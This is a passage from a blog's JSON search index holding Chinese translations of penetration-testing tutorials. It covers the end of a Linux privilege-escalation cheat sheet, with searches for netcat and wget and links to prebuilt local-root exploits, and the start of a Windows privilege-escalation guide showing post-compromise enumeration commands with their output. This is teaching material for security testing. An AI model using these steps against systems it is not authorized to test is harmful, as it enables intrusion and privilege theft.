\\) -print # Noowner files 准备和寻找利用代码安装/支持哪些开发工具/语言？find &#x2F; -name perl* find &#x2F; -name python* find &#x2F; -name gcc* find &#x2F; -name cc 如何上传文件？find &#x2F; -name wget find &#x2F; -name nc* find &#x2F; -name netcat* find &#x2F; -name tftp* find &#x2F; -name ftp 查找漏洞利用代码http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com 查找有关该漏洞利用的更多信息http://www.cvedetails.com http:&#x2F;&#x2F;packetstormsecurity.org&#x2F;files&#x2F;cve&#x2F;[CVE] http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;[CVE] http:&#x2F;&#x2F;www.vulnview.com&#x2F;cve-details.php?cvename&#x3D;[CVE] （快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/ http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/ 缓解措施上述任何信息都很容易找到吗？试试吧！设置一个自动执行脚本和/或第三方产品的cron作业 系统是否完全打补丁？内核，操作系统，所有应用程序，插件和Web服务 apt-get update &amp;&amp; apt-get upgrade yum update 服务是否以最低权限级别运行？例如，您是否需要以root身份运行MySQL？ 脚本任何一个都可以自动化吗？！http://pentestmonkey.net/tools/unix-privesc-check/ http://labs.portcullis.co.uk/application/enum4linux/ http://bastille-linux.sourceforge.net","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Windows权限提升基础","slug":"Windows权限提升基础","date":"2019-03-18T05:29:26.000Z","updated":"2020-11-20T08:42:24.000Z","comments":true,"path":"2019/03/Windows权限提升基础/","link":"","permalink":"https://misakikata.github.io/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/","excerpt":"","text":"原文链接：http://www.fuzzysecurity.com/tutorials/16.html Windows权限提升基础没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer … 与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。 应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。 最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。 不可或缺的资源：Windows Privilege Escalation百科全书（Brett Moore） - 这里。Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） - 这里。通过利用弱文件夹权限提升权限（Parvez Anwar） - 这里。 Δt for t0 to t3 - 初始信息收集 本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。 最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。 首先让我们找出我们连接的操作系统： C:\\Windows\\system32&gt; systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。 C:\\Windows\\system32&gt; hostname b33f C:\\Windows\\system32&gt; echo %username% user1 现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。 C:\\Windows\\system32&gt; net users User accounts for \\\\B33F ------------------------------------------------------------------------------- Administrator b33f Guest user1 The command completed successfully. C:\\Windows\\system32&gt; net user user1 User name user1 Full Name Comment User&#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 1&#x2F;11&#x2F;2014 7:47:14 PM Password expires Never Password changeable 1&#x2F;11&#x2F;2014 7:47:14 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 1&#x2F;11&#x2F;2014 8:05:09 PM Logon hours allowed All Local Group Memberships *Users Global Group memberships *None The command completed successfully. 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。 首先让我们看一下可用的网络接口和路由表。 C:\\Windows\\system32&gt; ipconfig &#x2F;all Windows IP Configuration Host Name . . . . . . . . . . . . : b33f Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Bluetooth Network Connection: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network) Physical Address. . . . . . . . . : 0C-84-DC-62-60-29 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO&#x2F;1000 MT Network Connection Physical Address. . . . . . . . . : 00-0C-29-56-79-35 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred) IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM Default Gateway . . . . . . . . . : 192.168.0.1 DHCP Server . . . . . . . . . . . : 192.168.0.1 DHCPv6 IAID . . . . . . . . . . . : 234884137 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35 DNS Servers . . . . . . . . . . . : 192.168.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled C:\\Windows\\system32&gt; route print &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO&#x2F;1000 MT Network Connection 1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; IPv4 Route Table &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 192.168.0.1 192.168.0.104 10 127.0.0.0 255.0.0.0 On-link 127.0.0.1 306 127.0.0.1 255.255.255.255 On-link 127.0.0.1 306 127.255.255.255 255.255.255.255 On-link 127.0.0.1 306 192.168.0.0 255.255.255.0 On-link 192.168.0.104 266 192.168.0.104 255.255.255.255 On-link 192.168.0.104 266 192.168.0.255 255.255.255.255 On-link 192.168.0.104 266 224.0.0.0 240.0.0.0 On-link 127.0.0.1 306 224.0.0.0 240.0.0.0 On-link 192.168.0.104 266 255.255.255.255 255.255.255.255 On-link 127.0.0.1 306 255.255.255.255 255.255.255.255 On-link 192.168.0.104 266 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Persistent Routes: None IPv6 Route Table &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Active Routes: If Metric Network Destination Gateway 14 58 ::&#x2F;0 On-link 1 306 ::1&#x2F;128 On-link 14 58 2001::&#x2F;32 On-link 14 306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97&#x2F;128 On-link 11 266 fe80::&#x2F;64 On-link 14 306 fe80::&#x2F;64 On-link 14 306 fe80::8d2:b4e:3f57:ff97&#x2F;128 On-link 11 266 fe80::5cd4:9caf:61c0:ba6e&#x2F;128 On-link 1 306 ff00::&#x2F;8 On-link 14 306 ff00::&#x2F;8 On-link 11 266 ff00::&#x2F;8 On-link &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Persistent Routes: None # arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces. C:\\Windows\\system32&gt; arp -A Interface: 192.168.0.104 --- 0xb Internet Address Physical Address Type 192.168.0.1 90-94-e4-c5-b0-46 dynamic 192.168.0.101 ac-22-0b-af-bb-43 dynamic 192.168.0.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.251 01-00-5e-00-00-fb static 224.0.0.252 01-00-5e-00-00-fc static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static 这将我们带到活动网络连接和防火墙规则。 C:\\Windows\\system32&gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 684 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:5354 0.0.0.0:0 LISTENING 1400 TCP 192.168.0.104:139 0.0.0.0:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 684 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5357 [::]:0 LISTENING 4 UDP 0.0.0.0:5355 *:* 1100 UDP 0.0.0.0:52282 *:* 976 UDP 0.0.0.0:55202 *:* 2956 UDP 0.0.0.0:59797 *:* 1400 UDP 127.0.0.1:1900 *:* 2956 UDP 127.0.0.1:65435 *:* 2956 UDP 192.168.0.104:137 *:* 4 UDP 192.168.0.104:138 *:* 4 UDP 192.168.0.104:1900 *:* 2956 UDP 192.168.0.104:5353 *:* 1400 UDP 192.168.0.104:65434 *:* 2956 UDP [::]:5355 *:* 1100 UDP [::]:52281 *:* 976 UDP [::]:52283 *:* 976 UDP [::]:55203 *:* 2956 UDP [::]:59798 *:* 1400 UDP [::1]:1900 *:* 2956 UDP [::1]:5353 *:* 1400 UDP [::1]:65433 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:1900 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:65432 *:* 2956 # The following two netsh commands are examples of commands that are not universal across OS&#x2F;SP. The netsh firewall commands are only available from XP SP2 and upwards. C:\\Windows\\system32&gt; netsh firewall show state Firewall status: ------------------------------------------------------------------- Profile &#x3D; Standard Operational mode &#x3D; Enable Exception mode &#x3D; Enable Multicast&#x2F;broadcast response mode &#x3D; Enable Notification mode &#x3D; Enable Group policy version &#x3D; Windows Firewall Remote admin mode &#x3D; Disable Ports currently open on all network interfaces: Port Protocol Version Program ------------------------------------------------------------------- No ports are currently open on all network interfaces. C:\\Windows\\system32&gt; netsh firewall show config Domain profile configuration: ------------------------------------------------------------------- Operational mode &#x3D; Enable Exception mode &#x3D; Enable Multicast&#x2F;broadcast response mode &#x3D; Enable Notification mode &#x3D; Enable Allowed programs configuration for Domain profile: Mode Traffic direction Name &#x2F; Program ------------------------------------------------------------------- Port configuration for Domain profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Domain profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Standard profile configuration (current): ------------------------------------------------------------------- Operational mode &#x3D; Enable Exception mode &#x3D; Enable Multicast&#x2F;broadcast response mode &#x3D; Enable Notification mode &#x3D; Enable Service configuration for Standard profile: Mode Customized Name ------------------------------------------------------------------- Enable No Network Discovery Allowed programs configuration for Standard profile: Mode Traffic direction Name &#x2F; Program ------------------------------------------------------------------- Enable Inbound COMRaider &#x2F; E:\\comraider\\comraider.exe Enable Inbound nc.exe &#x2F; C:\\users\\b33f\\desktop\\nc.exe Port configuration for Standard profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Standard profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Log configuration: ------------------------------------------------------------------- File location &#x3D; C:\\Windows\\system32\\LogFiles\\Firewall\\pfirewall.log Max file size &#x3D; 4096 KB Dropped packets &#x3D; Disable Connections &#x3D; Disable 最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。 # This will display verbose output for all scheduled tasks, below you can see sample output for a single task. C:\\Windows\\system32&gt; schtasks &#x2F;query &#x2F;fo LIST &#x2F;v Folder: \\Microsoft\\Windows Defender HostName: B33F TaskName: \\Microsoft\\Windows Defender\\MP Scheduled Scan Next Run Time: 1&#x2F;22&#x2F;2014 5:11:13 AM Status: Ready Logon Mode: Interactive&#x2F;Background Last Run Time: N&#x2F;A Last Result: 1 Author: N&#x2F;A Task To Run: c:\\program files\\windows defender\\MpCmdRun.exe Scan -ScheduleJob -WinTask -RestrictPrivilegesScan Start In: N&#x2F;A Comment: Scheduled Scan Scheduled Task State: Enabled Idle Time: Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes Power Management: No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: Daily Start Time: 5:11:13 AM Start Date: 1&#x2F;1&#x2F;2000 End Date: 1&#x2F;1&#x2F;2100 Days: Every 1 day(s) Months: N&#x2F;A Repeat: Every: Disabled Repeat: Until: Time: Disabled Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled [..Snip..] # The following command links running processes to started services. C:\\Windows\\system32&gt; tasklist &#x2F;SVC Image Name PID Services &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; System Idle Process 0 N&#x2F;A System 4 N&#x2F;A smss.exe 244 N&#x2F;A csrss.exe 332 N&#x2F;A csrss.exe 372 N&#x2F;A wininit.exe 380 N&#x2F;A winlogon.exe 428 N&#x2F;A services.exe 476 N&#x2F;A lsass.exe 484 SamSs lsm.exe 496 N&#x2F;A svchost.exe 588 DcomLaunch, PlugPlay, Power svchost.exe 668 RpcEptMapper, RpcSs svchost.exe 760 Audiosrv, Dhcp, eventlog, HomeGroupProvider, lmhosts, wscsvc svchost.exe 800 AudioEndpointBuilder, CscService, Netman, SysMain, TrkWks, UxSms, WdiSystemHost, wudfsvc svchost.exe 836 AeLookupSvc, BITS, gpsvc, iphlpsvc, LanmanServer, MMCSS, ProfSvc, Schedule, seclogon, SENS, ShellHWDetection, Themes, Winmgmt, wuauserv audiodg.exe 916 N&#x2F;A svchost.exe 992 EventSystem, fdPHost, netprofm, nsi, WdiServiceHost, WinHttpAutoProxySvc svchost.exe 1104 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc spoolsv.exe 1244 Spooler svchost.exe 1272 BFE, DPS, MpsSvc mDNSResponder.exe 1400 Bonjour Service taskhost.exe 1504 N&#x2F;A taskeng.exe 1556 N&#x2F;A vmtoolsd.exe 1580 VMTools dwm.exe 1660 N&#x2F;A explorer.exe 1668 N&#x2F;A vmware-usbarbitrator.exe 1768 VMUSBArbService TPAutoConnSvc.exe 1712 TPAutoConnSvc [..Snip..] C:\\Windows\\system32&gt; net start These Windows services are started: Application Experience Application Information Background Intelligent Transfer Service Base Filtering Engine Bluetooth Support Service Bonjour Service COM+ Event System COM+ System Application Cryptographic Services DCOM Server Process Launcher Desktop Window Manager Session Manager DHCP Client Diagnostic Policy Service Diagnostic Service Host Diagnostic System Host Distributed Link Tracking Client Distributed Transaction Coordinator DNS Client Function Discovery Provider Host Function Discovery Resource Publication Group Policy Client [..Snip..] # This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise. C:\\Windows\\system32&gt; DRIVERQUERY Module Name Display Name Driver Type Link Date &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1394ohci 1394 OHCI Compliant Ho Kernel 11&#x2F;20&#x2F;2010 6:01:11 PM ACPI Microsoft ACPI Driver Kernel 11&#x2F;20&#x2F;2010 4:37:52 PM AcpiPmi ACPI Power Meter Drive Kernel 11&#x2F;20&#x2F;2010 4:47:55 PM adp94xx adp94xx Kernel 12&#x2F;6&#x2F;2008 7:59:55 AM adpahci adpahci Kernel 5&#x2F;2&#x2F;2007 1:29:26 AM adpu320 adpu320 Kernel 2&#x2F;28&#x2F;2007 8:03:08 AM AFD Ancillary Function Dri Kernel 11&#x2F;20&#x2F;2010 4:40:00 PM agp440 Intel AGP Bus Filter Kernel 7&#x2F;14&#x2F;2009 7:25:36 AM aic78xx aic78xx Kernel 4&#x2F;12&#x2F;2006 8:20:11 AM aliide aliide Kernel 7&#x2F;14&#x2F;2009 7:11:17 AM amdagp AMD AGP Bus Filter Dri Kernel 7&#x2F;14&#x2F;2009 7:25:36 AM amdide amdide Kernel 7&#x2F;14&#x2F;2009 7:11:19 AM AmdK8 AMD K8 Processor Drive Kernel 7&#x2F;14&#x2F;2009 7:11:03 AM AmdPPM AMD Processor Driver Kernel 7&#x2F;14&#x2F;2009 7:11:03 AM amdsata amdsata Kernel 3&#x2F;19&#x2F;2010 9:08:27 AM amdsbs amdsbs Kernel 3&#x2F;21&#x2F;2009 2:35:26 AM amdxata amdxata Kernel 3&#x2F;20&#x2F;2010 12:19:01 AM AppID AppID Driver Kernel 11&#x2F;20&#x2F;2010 5:29:48 PM arc arc Kernel 5&#x2F;25&#x2F;2007 5:31:06 AM [..Snip..] Δt for t4 - WMIC的奥术艺术 我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。 完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。 我在下面列出了两个非常值得阅读的资源：Command-Line Ninjitsu（SynJunkie） - 这里是Windows WMIC命令行（ComputerHope） - 这里 不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。 为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。 C:\\Windows\\system32&gt; wmic &#x2F;? [global switches] The following global switches are available: &#x2F;NAMESPACE Path for the namespace the alias operate against. &#x2F;ROLE Path for the role containing the alias definitions. &#x2F;NODE Servers the alias will operate against. &#x2F;IMPLEVEL Client impersonation level. &#x2F;AUTHLEVEL Client authentication level. &#x2F;LOCALE Language id the client should use. &#x2F;PRIVILEGES Enable or disable all privileges. &#x2F;TRACE Outputs debugging information to stderr. &#x2F;RECORD Logs all input commands and output. &#x2F;INTERACTIVE Sets or resets the interactive mode. &#x2F;FAILFAST Sets or resets the FailFast mode. &#x2F;USER User to be used during the session. &#x2F;PASSWORD Password to be used for session login. &#x2F;OUTPUT Specifies the mode for output redirection. &#x2F;APPEND Specifies the mode for output redirection. &#x2F;AGGREGATE Sets or resets aggregate mode. &#x2F;AUTHORITY Specifies the for the connection. &#x2F;?[:&lt;BRIEF|FULL&gt;] Usage information. For more information on a specific global switch, type: switch-name &#x2F;? The following alias&#x2F;es are available in the current role: ALIAS - Access to the aliases available on the local system BASEBOARD - Base board (also known as a motherboard or system board) management. BIOS - Basic input&#x2F;output services (BIOS) management. BOOTCONFIG - Boot configuration management. CDROM - CD-ROM management. COMPUTERSYSTEM - Computer system management. CPU - CPU management. CSPRODUCT - Computer system product information from SMBIOS. DATAFILE - DataFile Management. DCOMAPP - DCOM Application management. DESKTOP - User&#39;s Desktop management. DESKTOPMONITOR - Desktop Monitor management. DEVICEMEMORYADDRESS - Device memory addresses management. DISKDRIVE - Physical disk drive management. DISKQUOTA - Disk space usage for NTFS volumes. DMACHANNEL - Direct memory access (DMA) channel management. ENVIRONMENT - System environment settings management. FSDIR - Filesystem directory entry management. GROUP - Group account management. IDECONTROLLER - IDE Controller management. IRQ - Interrupt request line (IRQ) management. JOB - Provides access to the jobs scheduled using the schedule service. LOADORDER - Management of system services that define execution dependencies. LOGICALDISK - Local storage device management. LOGON - LOGON Sessions. MEMCACHE - Cache memory management. MEMORYCHIP - Memory chip information. MEMPHYSICAL - Computer system&#39;s physical memory management. NETCLIENT - Network Client management. NETLOGIN - Network login information (of a particular user) management. NETPROTOCOL - Protocols (and their network characteristics) management. NETUSE - Active network connection management. NIC - Network Interface Controller (NIC) management. NICCONFIG - Network adapter management. NTDOMAIN - NT Domain management. NTEVENT - Entries in the NT Event Log. NTEVENTLOG - NT eventlog file management. ONBOARDDEVICE - Management of common adapter devices built into the motherboard (system board). OS - Installed Operating System&#x2F;s management. PAGEFILE - Virtual memory file swapping management. PAGEFILESET - Page file settings management. PARTITION - Management of partitioned areas of a physical disk. PORT - I&#x2F;O port management. PORTCONNECTOR - Physical connection ports management. PRINTER - Printer device management. PRINTERCONFIG - Printer device configuration management. PRINTJOB - Print job management. PROCESS - Process management. PRODUCT - Installation package task management. QFE - Quick Fix Engineering. QUOTASETTING - Setting information for disk quotas on a volume. RDACCOUNT - Remote Desktop connection permission management. RDNIC - Remote Desktop connection management on a specific network adapter. RDPERMISSIONS - Permissions to a specific Remote Desktop connection. RDTOGGLE - Turning Remote Desktop listener on or off remotely. RECOVEROS - Information that will be gathered from memory when the operating system fails. REGISTRY - Computer system registry management. SCSICONTROLLER - SCSI Controller management. SERVER - Server information management. SERVICE - Service application management. SHADOWCOPY - Shadow copy management. SHADOWSTORAGE - Shadow copy storage area management. SHARE - Shared resource management. SOFTWAREELEMENT - Management of the elements of a software product installed on a system. SOFTWAREFEATURE - Management of software product subsets of SoftwareElement. SOUNDDEV - Sound Device management. STARTUP - Management of commands that run automatically when users log onto the computer system. SYSACCOUNT - System account management. SYSDRIVER - Management of the system driver for a base service. SYSTEMENCLOSURE - Physical system enclosure management. SYSTEMSLOT - Management of physical connection points including ports, slots and peripherals, and proprietary connections points. TAPEDRIVE - Tape drive management. TEMPERATURE - Data management of a temperature sensor (electronic thermometer). TIMEZONE - Time zone data management. UPS - Uninterruptible power supply (UPS) management. USERACCOUNT - User account management. VOLTAGE - Voltage sensor (electronic voltmeter) data management. VOLUME - Local storage volume management. VOLUMEQUOTASETTING - Associates the disk quota setting with a specific disk volume. VOLUMEUSERQUOTA - Per user storage volume quota management. WMISET - WMI service operational parameters management. For more information on a specific alias, type: alias &#x2F;? CLASS - Escapes to full WMI schema. PATH - Escapes to full WMI object paths. CONTEXT - Displays the state of all the global switches. QUIT&#x2F;EXIT - Exits the program. For more information on 